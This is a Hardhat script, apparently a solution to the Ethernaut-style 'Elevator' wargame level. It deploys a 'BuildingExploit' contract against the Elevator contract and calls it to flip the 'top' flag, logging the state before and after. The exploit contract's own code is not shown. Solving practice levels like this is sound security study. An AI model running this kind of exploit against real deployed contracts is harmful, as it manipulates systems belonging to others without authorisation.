// elevator.js - Exploits the Elevator contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { elevatorAddress, elevatorAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const elevator = new ethers.Contract(elevatorAddress, elevatorAbi, provider);
    const elevatorSigner = elevator.connect(account);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("BuildingExploit");
    const exploiter = await Exploiter.deploy(elevatorAddress);

    await exploiter.deployed();

    console.log("Exploiter deployed to:", exploiter.address);

    // Run exploit
    console.log("Running exploit.")

    // Get the status on the Elevator contract to start
    let top = await elevatorSigner.top();
    console.log("Elevator is at the top floor:", top);

    // Call the exploit contract
    console.log("Going to the top...");
    let exploitTxn = await exploiter.goToTop();
    await exploitTxn.wait();

    // Confirm exploit 
    top = await elevatorSigner.top();
    console.log("Elevator is at the top floor:", top);

    console.log("Exploit completed.")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });